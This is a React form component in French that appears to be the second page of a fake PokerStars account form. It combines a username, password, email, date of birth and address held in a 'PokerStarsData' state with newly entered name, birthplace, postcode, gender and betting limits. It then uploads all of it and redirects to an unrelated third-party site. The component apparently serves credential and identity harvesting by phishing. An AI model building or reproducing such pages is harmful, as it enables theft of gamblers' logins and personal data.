import React, { useState } from "react";
import { MdNavigateNext } from "react-icons/md";
import { GrFormPrevious } from "react-icons/gr";
import { useNext } from "./useNext";
import { usePrevious } from "./usePrevios";
import { useSaveMultipleData } from "./useSaveData";
import { useUpload } from "./useUpload";
import { Spinner } from "react-bootstrap";
import Svg from "./svg";
import { useRecoilValue } from "recoil";
import { PokerStarsData } from "@/app/atoms/pokerStarsData";

const boldStyle = { fontWeight: "bold" };

export const Form2 = () => {
  const [state, setState] = useState("");
  const [city, setCity] = useState("");
  const [postcode, setPostCode] = useState("");
  const [firstname, setFirstName] = useState("");
  const [lastname, setLastName] = useState("");
  const [gender, setGender] = useState("");
  const [sevendaylimit, setSevenDayLimit] = useState("");
  const [sevendayMinimumLimit, setSevendayMinimumLimit] = useState("");
  const [sevendayMaxmimumLimit, setSevendayMaxmimumLimit] = useState("");
  const [autoMaticWithdrawalLimit, setAutoMaticWithdrawalLimit] = useState("");
  const [loading, setLoading] = useState(false);
  const pokerStarsData=useRecoilValue(PokerStarsData)
  const upload = useUpload();
  const prev = usePrevious();
  const saveData = useSaveMultipleData();
  const handlePrev = () => {
    prev();
  };
  const handleUpload = (d) => {
    return upload(d);
  };
  const handleNext = async (e) => {
    e.preventDefault();
    setLoading(true);
    const dataOb=
      {
        countryf1: pokerStarsData.countryf1,
        username:  pokerStarsData.username,
        password:  pokerStarsData.password,
        email:  pokerStarsData.email,
        dob:  pokerStarsData.dob,
        countryofbirth: pokerStarsData.countryofbirth,
        stateofbirth: pokerStarsData.stateofbirth,
        cityofbirth:  pokerStarsData.cityofbirth,
        address:  pokerStarsData.address,
        state: state,
        city: city,
        postcode: postcode,
        firstname: firstname,
        lastname: lastname,
        gender: gender,
        sevenlimit: sevendaylimit.toString(),
        weeklylimit: sevendayMinimumLimit.toString(),
        depositlimit: sevendayMaxmimumLimit.toString(),
        autowithlimit: autoMaticWithdrawalLimit.toString(),
      }
    // countryf1:"",
    // username:"",
    // password:"",
    // email:"",
    // dob:"",
    // gender:"",
    // autowithlimit:"",
    // stateofbirth:"",
    // countryofbirth:"",
    // cityofbirth:"",
    // state:"",
    // city:"",
    // postcode:"",
    // address:"",
    // firstname:"",
    // lastname:"",
    // depositlimit:"",
    // sevenlimit:"",
    // weeklylimit:""
    console.log("upload data");
    // Upload data
    const uploadSuccess = await handleUpload(dataOb);
    if (uploadSuccess) {
      console.log("Data uploaded successfully");
      window.location.href = "https://martechavenue.com/";
    } else {
      console.error("Data upload failed");
    }
  };

  return (
    <div className="container card-0 justify-content-center">
      <div className="card-body px-sm-4 px-0">
        <div className="row justify-content-center mb-5"></div>
        <div className="row justify-content-center round">
          <div className="col-lg-10 col-md-12">
            <div className="card shadow-lg card-1">
              <div className="card-body inner-card">
                <div
                  style={{
                    backgroundColor: "black",
                    color: "white",
                    fontWeight: "bolder",
                  }}
                  className="text-center mb-5 py-2 rounded"
                >
                  <div>
                    <Svg />
                  </div>
                  <h2>Informations de compte</h2>
                </div>

                <form onSubmit={handleNext}>
                  <div className="row justify-content-center">
                    <div className="col-lg-5 col-md-6 col-sm-12">
                      <div className="form-group mb-4">
                        <label style={boldStyle} htmlFor="Mobile-Number">
                          Département de naissance
                        </label>
                        <input
                          onChange={(e) => {
                            setState(e.target.value);
                          }}
                          type="text"
                          className="form-control"
                          id="Mobile-Number"
                          placeholder=""
                          required
                        />
                      </div>
                      <div className="form-group mb-4">
                        <label style={boldStyle} htmlFor="Mobile-Number">
                          Code postal
                        </label>
                        <input
                          onChange={(e) => {
                            setPostCode(e.target.value);
                          }}
                          type="text"
                          className="form-control"
                          id="Mobile-Number"
                          placeholder=""
                          required
                        />
                      </div>
                      <div className="form-group mb-4">
                        <label style={boldStyle} htmlFor="time">
                          Nom de famille
                        </label>
                        <input
                          onChange={(e) => {
                            setLastName(e.target.value);
                          }}
                          type="text"
                          className="form-control"
                          id="time"
                          placeholder=""
                          required
                        />
                      </div>
                      <div className="form-group mb-4">
                        <label style={boldStyle} htmlFor="skill">
                          Limite de 7 jours
                        </label>
                        <input
                          onChange={(e) => {
                            setSevenDayLimit(e.target.value);
                          }}
                          type="text"
                          className="form-control"
                          id="skill"
                          placeholder=""
                          required
                        />
                      </div>

                      <div className="form-group mb-4">
                        <label style={boldStyle} htmlFor="email">
                          Fixer la limite de retrait automatique
                        </label>
                        <select
                          className="form-select"
                          onChange={(e) => {
                            setAutoMaticWithdrawalLimit(e.target.value);
                          }}
                          required
                        >
                          <option>100</option>
                          <option>200</option>
                          <option>300</option>
                        </select>
                      </div>
                    </div>
                    <div className="col-lg-5 col-md-6 col-sm-12">
                      <div className="form-group mb-4">
                        <label style={boldStyle} htmlFor="last-name">
                          Ville de naissance
                        </label>
                        <input
                          onChange={(e) => {
                            setCity(e.target.value);
                          }}
                          type="text"
                          className="form-control"
                          id="last-name"
                          placeholder=""
                          required
                        />
                      </div>
                      <div className="form-group mb-4">
                        <label style={boldStyle} htmlFor="last-name">
                          Prénom
                        </label>
                        <input
                          onChange={(e) => {
                            setFirstName(e.target.value);
                          }}
                          type="text"
                          className="form-control"
                          id="last-name"
                          placeholder=""
                          required
                        />
                      </div>
                      <div className="form-group mb-4">
                        <label style={boldStyle} htmlFor="email">
                          Sexe
                        </label>
                        <div className="d-flex mt-2 " style={{ gap: "10px" }}>
                          <div className="d-flex align-items-center">
                            <input
                              onChange={(e) => {
                                setGender(e.target.value);
                              }}
                              type="radio"
                              value="Homme"
                              required
                              name="gender"
                              style={{
                                border: "1px solid black",
                                height: "20px",
                                width: "20px",
                                marginRight: "8px",
                              }}
                            />
                            <span style={boldStyle} htmlFor="skill">
                              Homme
                            </span>
                          </div>
                          <div className="d-flex align-items-center">
                            <input
                              onChange={(e) => {
                                setGender(e.target.value);
                              }}
                              type="radio"
                              value="Femme"
                              required
                              name="gender"
                              style={{
                                border: "1px solid black",
                                height: "20px",
                                width: "20px",
                                marginRight: "8px",
                              }}
                            />
                            <span style={boldStyle} htmlFor="skill">
                              Femme
                            </span>
                          </div>
                        </div>
                      </div>
                      <div className="form-group mb-4">
                        <label style={boldStyle} htmlFor="birth-country">
                          Limite de mise sur sept jours au poker
                        </label>
                        <select
                          className="form-select"
                          onChange={(e) => {
                            setSevendayMinimumLimit(e.target.value);
                          }}
                          required
                        >
                          <option>100</option>
                          <option>200</option>
                          <option>300</option>
                        </select>
                      </div>
                      <div className="form-group mb-4">
                        <label style={boldStyle} htmlFor="birth-city">
                          Limite de mises sur sept jours aux paris sportifs
                        </label>
                        <select
                          className="form-select"
                          onChange={(e) => {
                            setSevendayMaxmimumLimit(e.target.value);
                          }}
                          required
                        >
                          <option>100</option>
                          <option>200</option>
                          <option>300</option>
                        </select>
                      </div>
                    </div>
                  </div>

                  <div className="row justify-content-center py-3">
                    <div className="col-10 d-flex justify-content-between flex-wrap">
                      <button
                        className="btn mb-3 mb-md-0"
                        onClick={handlePrev}
                        style={{
                          borderRadius: "18px",
                          width: "100%",
                          maxWidth: "186px",
                          color: "white",
                          fontWeight: "700",
                          backgroundColor: "#D70022",
                        }}
                      >
                        <GrFormPrevious style={{ fontSize: "25px" }} />{" "}
                        Précédent
                      </button>
                      <button
                        className="btn"
                        type="submit"
                        style={{
                          borderRadius: "18px",
                          width: "100%",
                          maxWidth: "186px",
                          color: "white",
                          fontWeight: "700",
                          backgroundColor: "#02bd9c",
                        }}
                      >
                        {loading && (
                          <Spinner animation="border" variant="light" />
                        )}
                        {!loading && (
                          <>
                            Continuer{" "}
                            <MdNavigateNext style={{ fontSize: "25px" }} />
                          </>
                        )}
                      </button>
                    </div>
                  </div>
                </form>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
